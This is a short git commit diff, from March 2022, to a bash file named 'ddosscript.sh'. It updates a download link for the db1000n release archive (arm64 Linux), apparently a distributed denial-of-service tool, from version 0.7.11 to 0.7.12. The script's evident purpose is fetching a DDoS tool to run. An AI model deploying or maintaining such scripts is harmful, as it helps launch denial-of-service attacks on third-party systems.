4110532a1df61bb8a92d0875dd55bc9df2ff52f1
Andrii-Asiox <60571856+Andrii-Asiox@users.noreply.github.com>
2022-03-17 14:06:11 +0200

    0.7.12

--- ddosscript.sh
+++ ddosscript.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-dbLink="https://github.com/Arriven/db1000n/releases/download/v0.7.11/db1000n-v0.7.11-linux-arm64.tar.gz"
+dbLink="https://github.com/Arriven/db1000n/releases/download/v0.7.12/db1000n-v0.7.12-linux-arm64.tar.gz"
 dbTarFile="db1000n_arm64_archive.tar.gz"
 
 rm db1000n*
